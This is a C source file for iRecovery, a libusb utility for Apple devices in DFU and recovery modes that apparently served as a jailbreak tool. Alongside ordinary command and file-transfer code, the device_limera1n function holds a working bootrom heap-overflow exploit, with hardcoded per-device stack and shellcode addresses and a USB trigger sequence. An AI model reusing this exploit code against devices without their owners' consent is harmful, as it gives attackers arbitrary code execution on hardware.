/**
 * iRecovery - Utility for DFU 2.0, WTF and Recovery Mode
 * Copyright (C) 2008 - 2009 westbaer
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

#include <readline/readline.h>
#include <readline/history.h>
#include <libusb-1.0/libusb.h>

#include "limera1n_payload.h"

#define VERSION			"2.0.2"
#define LIBUSB_VERSION	"1.0"
#define LIBUSB_DEBUG		0

#define VENDOR_ID       (int)0x05AC
#define NORM_MODE       (int)0x1290
#define RECV_MODE       (int)0x1281
#define WTF_MODE        (int)0x1227
#define DFU_MODE        (int)0x1222
#define BUF_SIZE        (int)0x10000

#define USB_TIMEOUT     10000

#include "dfuhash.h"

static int devicemode = -1;
static struct libusb_device_handle *device = NULL;

void device_connect() {

	if ((device = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, devicemode = RECV_MODE)) == NULL) {
		if ((device = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, devicemode = WTF_MODE)) == NULL) {
			if ((device = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, devicemode = DFU_MODE)) == NULL) {
				devicemode = -1;
			}
		}
	}

}

void device_close() {

	if (device != NULL) {
		printf("[Device] Closing Connection.\n");
		libusb_close(device);
	}

}

void device_reset() {

	if (device != NULL) {
		printf("[Device] Reseting Connection.\n");
		libusb_reset_device(device);
	}

}

int device_sendcmd(char* argv[]) {

	char* command = argv[0];
	size_t length = strlen(command);

	if (length >= 0x200) {
		printf("[Device] Failed to send command (too long).\n");
		return -1;
	}

	if (! libusb_control_transfer(device, 0x40, 0, 0, 0, command, (length + 1), 1000)) {
		printf("[Device] Failed to send command.\n");
		return -1;
	}

	return 1;

}

int device_autoboot() {

	printf("[Device] Enabling auto-boot.\n");

	char* command[3];
	command[0] = "setenv auto-boot true";
	command[1] = "saveenv";
	command[2] = "reboot";

	device_sendcmd(&command[0]);
	device_sendcmd(&command[1]);
	device_sendcmd(&command[2]);

	return 1;

}

static int device_status(unsigned int* status) {
	unsigned char buffer[6];
	memset(buffer, '\0', 6);
	if (libusb_control_transfer(device, 0xA1, 3, 0, 0, buffer, 6, USB_TIMEOUT) != 6) {
		*status = 0;
		return -1;
	}

	*status = (unsigned int) buffer[4];

	return 0;
}

int device_send(char* filename, int dfu_notify_finished) {

	FILE* file = fopen(filename, "rb");

	if(file == NULL) {

		printf("[Program] Unable to find file. (%s)\n",filename);
		return 1;

	}

	fseek(file, 0, SEEK_END);
	unsigned int len = ftell(file);
	fseek(file, 0, SEEK_SET);

	unsigned char* buffer = malloc(len);

	if (buffer == NULL) {

		printf("[Program] Error allocating memory.\n");
		fclose(file);
		return 1;

	}

	fread(buffer, 1, len, file);
	fclose(file);

	int error = 0;
	int recovery_mode = (devicemode != DFU_MODE && devicemode != WTF_MODE);

	unsigned int h1 = 0xFFFFFFFF;
	unsigned char dfu_xbuf[12] = {0xff, 0xff, 0xff, 0xff, 0xac, 0x05, 0x00, 0x01, 0x55, 0x46, 0x44, 0x10};
	int packet_size = recovery_mode ? 0x8000 : 0x800;
	int last = len % packet_size;
	int packets = len / packet_size;

	if (last != 0) {
		packets++;
	} else {
		last = packet_size;
	}

	/* initiate transfer */
	if (recovery_mode) {
		error = libusb_control_transfer(device, 0x41, 0, 0, 0, NULL, 0, USB_TIMEOUT);
	} else {
		unsigned char dump[4];
		if (libusb_control_transfer(device, 0xa1, 5, 0, 0, dump, 1, USB_TIMEOUT) == 1) {
			error = 0;
		} else {
			error = -1;
		}
	}

	if (error) {
		printf("[Device] Error initializing transfer.\n");
		return error;
	}

	int i = 0;
	unsigned long count = 0;
	unsigned int status = 0;
	int bytes = 0;
	for (i = 0; i < packets; i++) {
		int size = (i + 1) < packets ? packet_size : last;

		/* Use bulk transfer for recovery mode and control transfer for DFU and WTF mode */
		if (recovery_mode) {
			error = libusb_bulk_transfer(device, 0x04, &buffer[i * packet_size], size, &bytes, USB_TIMEOUT);
		} else {
			int j;
			for (j = 0; j < size; j++) {
				dfu_hash_step(h1, buffer[i*packet_size + j]);
			}
			if (i+1 == packets) {
				for (j = 0; j < 2; j++) {
					dfu_hash_step(h1, dfu_xbuf[j*6 + 0]);
					dfu_hash_step(h1, dfu_xbuf[j*6 + 1]);
					dfu_hash_step(h1, dfu_xbuf[j*6 + 2]);
					dfu_hash_step(h1, dfu_xbuf[j*6 + 3]);
					dfu_hash_step(h1, dfu_xbuf[j*6 + 4]);
					dfu_hash_step(h1, dfu_xbuf[j*6 + 5]);
				}

				char* newbuf = (char*)malloc(size + 16);
				memcpy(newbuf, &buffer[i * packet_size], size);
				memcpy(newbuf+size, dfu_xbuf, 12);
				newbuf[size+12] = h1 & 0xFF;
				newbuf[size+13] = (h1 >> 8) & 0xFF;
				newbuf[size+14] = (h1 >> 16) & 0xFF;
				newbuf[size+15] = (h1 >> 24) & 0xFF;
				size += 16;
				bytes = libusb_control_transfer(device, 0x21, 1, i, 0, (unsigned char*)newbuf, size, USB_TIMEOUT);
				free(newbuf);
			} else {
				bytes = libusb_control_transfer(device, 0x21, 1, i, 0, &buffer[i * packet_size], size, USB_TIMEOUT);
			}
		}

		if (bytes != size) {
			printf("[Device] Error sending packet.\n");
			return -1;
		}

		if (!recovery_mode) {
			error = device_status(&status);
		}

		if (error) {
			printf("[Device] Error sending packet.\n");
			return error;
		}

		if (!recovery_mode && status != 5) {
			int retry = 0;

			while (retry < 20) {
				device_status(&status);
				if (status == 5) {
					break;
				}
				sleep(1);
				retry++;
			}

			if (status != 5) {
				printf("[Device] Invalid status error during file upload.\n");
				return -1;
			}
		}

		count += size;
		printf("Sent: %d bytes - %lu of %u\n", bytes, count, len);
	}

	if (dfu_notify_finished && !recovery_mode) {
		libusb_control_transfer(device, 0x21, 1, packets, 0, (unsigned char*) buffer, 0, USB_TIMEOUT);

		for (i = 0; i < 2; i++) {
			error = device_status(&status);
			if (error) {
				printf("[Device] Error receiving status while uploading file.\n");
				return error;
			}
		}

		if (dfu_notify_finished == 2) {
			/* we send a pseudo ZLP here just in case */
			libusb_control_transfer(device, 0x21, 1, 0, 0, 0, 0, USB_TIMEOUT);
		}

		device_reset();
	}

	printf("[Device] Successfully uploaded file.\n");

	free(buffer);
	return 0;
}

int device_upload(char* filename) {

	FILE* file = fopen(filename, "rb");

	if(file == NULL) {

		printf("[Program] Unable to find file. (%s)\n",filename);
		return 1;

	}

	fseek(file, 0, SEEK_END);
	unsigned int len = ftell(file);
	fseek(file, 0, SEEK_SET);

	unsigned char* buffer = malloc(len);

	if (buffer == NULL) {

		printf("[Program] Error allocating memory.\n");
		fclose(file);
		return 1;

	}

	fread(buffer, 1, len, file);
	fclose(file);

	int packets = len / 0x800;

	if(len % 0x800)
		packets++;

	int last = len % 0x800;

	if(!last)
		last = 0x800;

	int i = 0;
	unsigned int sizesent=0;
	unsigned char response[6];

	for(i = 0; i < packets; i++) {

		int size = i + 1 < packets ? 0x800 : last;

		sizesent+=size;
		printf("[Device] Sending packet %d of %d (0x%08x of 0x%08x bytes)\n", i+1, packets, sizesent, len);

		if(! libusb_control_transfer(device, 0x21, 1, i, 0, &buffer[i * 0x800], size, 1000)) {

			printf("[Device] Error sending packet.\n");
			return -1;

		}

		if( libusb_control_transfer(device, 0xA1, 3, 0, 0, response, 6, 1000) != 6) {

			printf("[Device] Error receiving status while uploading file.\n");
			return -1;

		}

		if(response[4] != 5) {

			printf("[Device] Invalid status error during file upload.\n");
			return -1;
		}

		printf("[Device] Upload successful.\n");
	}

	printf("[Device] Executing file.\n");

	libusb_control_transfer(device, 0x21, 1, i, 0, buffer, 0, 1000);

	for(i = 6; i <= 8; i++) {

		if(libusb_control_transfer(device, 0xA1, 3, 0, 0, response, 6, 1000) != 6) {

			printf("[Device] Error receiving execution status.\n");
			return -1;
		}

		if(response[4] != i) {

			printf("[Device] Invalid execution status.\n");
			return -1;
		}
	}

	printf("[Device] Successfully executed file.\n");

	free(buffer);
	return 0;
}

int device_buffer(char* data, int len) {

	int packets = len / 0x800;

	if(len % 0x800) {
		packets++;
	}

	int last = len % 0x800;

	if(!last) {
		last = 0x800;
	}

	int i = 0;

	unsigned char response[6];

	for(i = 0; i < packets; i++) {

		int size = i + 1 < packets ? 0x800 : last;

		if(! libusb_control_transfer(device, 0x21, 1, i, 0, &data[i * 0x800], size, 1000)) {

			printf("[Device] Error sending packet from buffer.\n");
			return -1;
		}

		if( libusb_control_transfer(device, 0xA1, 3, 0, 0, response, 6, 1000) != 6) {

			printf("[Device] Error receiving status from buffer.\n");
			return -1;
		}

		if(response[4] != 5) {

			printf("[Device] Invalid status error from buffer.\n");
			return -1;
		}
	}

	libusb_control_transfer(device, 0x21, 1, i, 0, data, 0, 1000);

	for(i = 6; i <= 8; i++) {

		if( libusb_control_transfer(device, 0xA1, 3, 0, 0, response, 6, 1000) != 6) {

			printf("[Device] Error receiving execution status from buffer.\n");
			return -1;
		}

		if(response[4] != i) {

			printf("[Device] Invalid execution status from buffer.\n");
			return -1;
		}
	}

	return 0;
}

int device_exploit(char* payload) {

	if(payload != NULL) {

		if(device_upload(payload) < 0) {

			printf("[Device] Error uploading payload.\n");
			return -1;

		}
	}

	if(!libusb_control_transfer(device, 0x21, 2, 0, 0, 0, 0, 1000)) {

		printf("[Device] Error sending exploit.\n");
		return -1;

	}

	return 0;
}

void dfu_notify_upload_finshed() {
	int i, ret = libusb_control_transfer(device, 0x21, 1, 0, 0, 0, 0, 100);
	for (i = 0; i < 3; i++) {
		unsigned char status[6];
		ret = libusb_control_transfer(device, 0xA1, 3, 0, 0, status, 6, 100);
	}
	libusb_reset_device(device);
}

int device_limera1n(const char *devicename) {
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	unsigned int stack_address = 0;
	unsigned int shellcode_address = 0;
	unsigned int shellcode_length = 0;

	if (devicemode != WTF_MODE) {
		printf("Put device in DFU mode.\n");
		return -1;
	}

	if (!strcmp(devicename, "iPhone3,1")) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	} else if (!strcmp(devicename, "iPhone2,1")) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	} else if (!strcmp(devicename, "iPod3,1")) {
		max_size = 0x24000;
		stack_address = 0x84033F98;
		shellcode_address = 0x84023001;
	} else {
		printf("Unsupported device %s. Can't exploit with limera1n.\n", devicename);
		return -1;
	}

	memset(shellcode, 0x0, 0x800);
	shellcode_length = sizeof(limera1n_payload);
	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));

	printf("Resetting device counters\n");
	libusb_control_transfer(device, 0x21, 4, 0, 0, 0, 0, USB_TIMEOUT);

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}

	printf("Sending chunk headers\n");
	libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 1000);

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}

	printf("Sending exploit payload\n");
	libusb_control_transfer(device, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

	printf("Sending fake data\n");
	memset(buf, 0xBB, 0x800);
	libusb_control_transfer(device, 0xA1, 1, 0, 0, buf, 0x800, 1000);
	libusb_control_transfer(device, 0x21, 1, 0, 0, buf, 0x800, 10);

	//printf("Executing exploit\n");
	libusb_control_transfer(device, 0x21, 2, 0, 0, buf, 0, 1000);

	device_reset();
	dfu_notify_upload_finshed();
	printf("Exploit sent\n");

	printf("Reconnecting to device\n");
	sleep(2);
	device_close();
	if ((device = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, devicemode = WTF_MODE)) == NULL) {
		printf("Cannot reconnect to WTF mode\n");
	}

	return 0;
}

int device_sendrawusb0xA1(char *command) {

	printf("[Device] Sending raw command to 0xA1, x, 0, 0, 0, 0, 1000.\n");
	return libusb_control_transfer(device, 0xA1, atoi(command), 0, 0, 0, 0, 1000);

}

int device_sendrawusb0x40(char *command) {

	printf("[Device] Sending raw command to 0x40, x, 0, 0, 0, 0, 1000.\n");
	return libusb_control_transfer(device, 0x40, atoi(command), 0, 0, 0, 0, 1000);

}

int device_sendrawusb0x21(char *command) {

	printf("[Device] Sending raw command to 0x21, x, 0, 0, 0, 0, 1000.\n");
	return libusb_control_transfer(device, 0x21, atoi(command), 0, 0, 0, 0, 1000);

}

int device_receive(char *buffer, int size) {
	int bytes = 0;
#if 0
	memset(buffer, 0, size);
	libusb_bulk_transfer(device, 0x81, buffer, size, &bytes, 500);
	return bytes;
#else
	int total = size;
	while (libusb_bulk_transfer(device, 0x81, buffer, size, &bytes, 100) == 0 && bytes) {
		buffer += bytes;
		size -= bytes;
	}
	return total - size;
#endif
}

void prog_usage() {

	printf("./irecovery [args]\n");
	printf("\t-a\t\tenables auto-boot and reboots the device (exit recovery loop).\n");
	printf("\t-s\t\tstarts a shell.\n");
	printf("\t-g <datafile>\tget data.\n");
	printf("\t-r\t\tusb reset.\n");
	printf("\t-f <file>\tsends a file.\n");
	printf("\t-u <file>\tuploads a file.\n");
	printf("\t-c \"command\"\tsend a single command.\n");
	printf("\t-b <file>\truns batch commands from a file(one per line).\n");
	printf("\t-x <file>\tuploads a file then resets the usb connection.\n");
	printf("\t-e <file>\tupload a file then run usb exploit.\n");
	printf("\t-x21 <command>\tsend a raw command to 0x21.\n");
	printf("\t-x40 <command>\tsend a raw command to 0x41.\n");
	printf("\t-xA1 <command>\tsend a raw command to 0xA1.\n");
	printf("\t-l <dev>\texploit with limera1n (iPhone3,1 or iPhone2,1 or iPod3,1).\n");
	printf("\n");
	printf("== Console / Batch Commands ==\n");
	printf("\n");
	printf("\t/auto-boot\tenables auto-boot and reboots the device (exit recovery loop).\n");
	printf("\t/exit\t\texit the recovery console.\n");
	printf("\t/send    <file>\tsend a file to the device.\n");
	printf("\t/upload  <file>\tupload a file to the device.\n");
	printf("\t/exploit <file>\tupload a file then execute a usb exploit.\n");
	printf("\t/batch   <file>\texecute commands from a batch file.\n");

}
void prog_init() {

	libusb_init(NULL);
	device_connect();

}

void prog_exit() {

	printf("\n");
	device_close();
	libusb_exit(NULL);
	exit(0);

}

int prog_batch(char *filename);

int prog_parse(char *command) {

	char* action = strtok(strdup(command), " ");

	if(! strcmp(action, "help")) {

		printf("Commands:\n");
		printf("\t/exit\t\t\texit from recovery console.\n");
		printf("\t/send <file>\t\tsend file to device.\n");
		printf("\t/upload <file>\t\tupload file to device.\n");
		printf("\t/exploit [payload]\tsend usb exploit packet.\n");
		printf("\t/batch <file>\t\texecute commands from a batch file.\n");
		printf("\t/auto-boot\t\t\tenable auto-boot (exit recovery loop).\n");

	} else if(! strcmp(action, "exit")) {

		free(action);
		return -1;

	} else if(strcmp(action, "send") == 0) {

		char* filename = strtok(NULL, " ");
		if(filename != NULL)
			device_send(filename, 0);

	} else if(strcmp(action, "upload") == 0) {

		char* filename = strtok(NULL, " ");
		if(filename != NULL)
			device_upload(filename);

	} else if(strcmp(action, "exploit") == 0) {

		char* payload = strtok(NULL, " ");

		if (payload != NULL)
			device_exploit(payload);
		else
			device_exploit(NULL);

	} else if (! strcmp(action, "batch")) {

		char* filename = strtok(NULL, " ");

		if (filename != NULL)
			prog_batch(filename);

	} else if (! strcmp(action, "auto-boot")) {

		device_autoboot();

	}

	free(action);
	return 0;
}

int prog_batch(char *filename) {

	//max command length
	char line[0x200];
	FILE* script = fopen(filename, "rb");

	if (script == NULL) {
		printf("[Program] Unable to find batch file.\n");
		return -1;
	}

	printf("\n");

	while (fgets(line, 0x200, script) != NULL) {

		if(!((line[0]=='/') && (line[1]=='/'))) {

			if(line[0] == '/') {

				printf("[Program] Running command: %s", line);

				int offset = (strlen(line) - 1);

				while(offset > 0) {

					if (line[offset] == 0x0D || line[offset] == 0x0A) line[offset--] = 0x00;
					else break;

				};

				prog_parse(&line[1]);

			} else {

				char *command[1];
				command[0] = line;
				device_sendcmd(command);

			}

		}

	}

	fclose(script);
	return 0;

}


int prog_console(char* logfile) {

	if(libusb_set_configuration(device, 1) < 0) {

		printf("[Program] Error setting configuration.\n");
		return -1;

	}

	if(libusb_claim_interface(device, 0) < 0) {

		printf("[Program] Error claiming interface.\n");
		return -1;

	}

	if(libusb_claim_interface(device, 1) < 0) {

		printf("[Program] Error claiming interface.\n");
		return -1;

	}

	if(libusb_set_interface_alt_setting(device, 1, 1) < 0) {

		printf("[Program] Error claiming alt interface.\n");
		return -1;

	}

	char* buffer = malloc(BUF_SIZE);
	if(buffer == NULL) {

		printf("[Program] Error allocating memory.\n");
		return -1;

	}

	FILE* fd = NULL;
	if(logfile != NULL) {

		fd = fopen(logfile, "w");
		if(fd == NULL) {
			printf("[Program] Unable to open log file.\n");
			free(buffer);
			return -1;
		}

	}

	printf("[Program] Attached to Recovery Console.\n");

	if (logfile)
		printf("[Program] Output being logged to: %s.\n", logfile);

	while(1) {

		int bytes = device_receive(buffer, BUF_SIZE);

		if (bytes>0) {
			int i;

			for(i = 0; i < bytes; ++i) {

				fprintf(stdout, "%c", buffer[i]);
				if(fd) fprintf(fd, "%c", buffer[i]);

			}
		}

		char *command = readline("iRecovery> ");

		if (command != NULL) {

			add_history(command);

			if(fd) fprintf(fd, ">%s\n", command);

			if (command[0] == '/') {

				if (prog_parse(&command[1]) < 0) {

					free(command);
					break;

				}

			} else {

				device_sendcmd(&command);

				char* action = strtok(strdup(command), " ");

				if (! strcmp(action, "getenv")) {
					char response[0x200];
					memset(response, 0, sizeof(response));
					libusb_control_transfer(device, 0xC0, 0, 0, 0, response, 0x200, 1000);
					printf("Env: %s\n", response);

				}

				if (! strcmp(action, "reboot"))
					return -1;
			}

		}

		free(command);
	}


	free(buffer);
	if(fd) fclose(fd);
	libusb_release_interface(device, 1);
	return 0;
}

static int
str2hex(int max, unsigned char *buf, const char *str)
{
	unsigned char *ptr = buf;
	int seq = -1;
	while (max > 0) {
		int nibble = *str++;
		if (nibble >= '0' && nibble <= '9') {
			nibble -= '0';
		} else {
			nibble |= 0x20;
			if (nibble >= 'a' && nibble <= 'f') {
				nibble -= 'a' - 10;
			} else {
				break;
			}
		}
		if (seq >= 0) {
			*buf++ = (seq << 4) | nibble;
			max--;
			seq = -1;
		} else {
			seq = nibble;
		}
	}
	return buf - ptr;
}

int prog_getdata(char* datafile) {

	if(libusb_set_configuration(device, 1) < 0) {

		printf("[Program] Error setting configuration.\n");
		return -1;

	}

	if(libusb_claim_interface(device, 1) < 0) {

		printf("[Program] Error claiming interface.\n");
		return -1;

	}

	if(libusb_set_interface_alt_setting(device, 1, 1) < 0) {

		printf("[Program] Error claiming alt interface.\n");
		return -1;

	}

	char* buffer = malloc(BUF_SIZE);
	if(buffer == NULL) {

		printf("[Program] Error allocating memory.\n");
		return -1;

	}

	FILE* fd = NULL;
	fd = fopen(datafile, "wb");
	if(fd == NULL) {
		printf("[Program] Unable to open data file.\n");
		free(buffer);
		return -1;
	}

	printf("[Program] Attached to Recovery Console.\n");

	int bytes = device_receive(buffer, BUF_SIZE);
	if (bytes > 0) {
		buffer[bytes - 1] = '\0';
		printf("%s", buffer);
	}

	while(1) {

		char *command = "go g";

		device_sendcmd(&command);

		char response[2048];
		memset(response, 0, sizeof(response));
		libusb_control_transfer(device, 0xC0, 0, 0, 0, response, sizeof(response), 1000);
		if (!memcmp(response, "end-of-transmission", 19)) {
			bytes = device_receive(buffer, BUF_SIZE);
			if (bytes > 0) {
				buffer[bytes - 1] = '\0';
				printf("%s", buffer);
			}
			break;
		}

		unsigned len, addr, rv;
		int where = -1;
		int n = sscanf(response, "%u:%x:%n", &len, &addr, &where);
		if (n != 2 || len == 0 || len >= BUF_SIZE || where < 0) {
			response[16] = '\0';
			printf("[Program] bad line %s...\n", response);
			break;
		}
		rv = str2hex(len, buffer, response + where);
		if (rv != len) {
			printf("[Program] bad conversion\n");
			break;
		}

		fwrite(buffer, 1, len, fd);
	}


	free(buffer);
	fclose(fd);
	libusb_release_interface(device, 1);
	return 0;
}

void prog_handle(int argc, char *argv[]) {

	if (! strcmp(argv[1], "-a")) {

		device_autoboot();

	} else if (! strcmp(argv[1], "-c")) {

		if (argc >= 3) {

			if (argc > 3) {

				char command[0x200];
				int i = 2;

				for (; i < argc; i++) {

					if (i > 2) strcat(command, " ");
					strcat(command, argv[i]);

				}

				argv[2] = command;
			}

			device_sendcmd(&argv[2]);

		}

	} else if (! strcmp(argv[1], "-r")) {

		device_reset();

	} else if (! strcmp(argv[1], "-b")) {

		prog_batch(argv[2]);

	} else if (! strcmp(argv[1], "-f")) {

		if (argc == 3) {

			device_send(argv[2], 1);

		}
	} else if (! strcmp(argv[1], "-u") || ! strcmp(argv[1], "-x")) {

		if (argc == 3) {

			device_upload(argv[2]);

			if (! strcmp(argv[1], "-x")) {

				device_reset();
			}
		}
	} else if(! strcmp(argv[1], "-e")) {

		if(argc >= 3)
			device_exploit(argv[2]);
		else
			device_exploit(NULL);

	} else if(! strcmp(argv[1], "-l")) {

		if(argc >= 3)
			device_limera1n(argv[2]);

	} else if (! strcmp(argv[1], "-s")) {

		if (argc >= 3) //Logfile specified
			prog_console(argv[2]);
		else
			prog_console(NULL);

	} else if (! strcmp(argv[1], "-g")) {

		if (argc >= 3)
			prog_getdata(argv[2]);
		else
			goto usage;

	} else usage: {

		printf("[Program] Invalid program argument specified.\n");
		prog_usage();

	}
}

int main(int argc, char *argv[]) {
	printf("iRecovery - Version: %s - For LIBUSB: %s\n", VERSION, LIBUSB_VERSION);
	printf("by westbaer. Thanks to pod2g, tom3q, planetbeing, geohot, posixninja, iH8sn0w.\nRewrite by GreySyntax.\nImproved by xerub.\n\n");

	if(argc < 2) {
		prog_usage();
		exit(1);
	}

	prog_init();

	(void) signal(SIGTERM, prog_exit);
	(void) signal(SIGQUIT, prog_exit);
	(void) signal(SIGINT, prog_exit);

	if (device == NULL) {
		printf("[Device] Failed to connect, check the device is in DFU or WTF (Recovery) Mode.\n");
		return -1;
	}

	printf("[Device] Connected.\n");

	prog_handle(argc, argv); //Handle arguments

	prog_exit();
	exit(0);
}
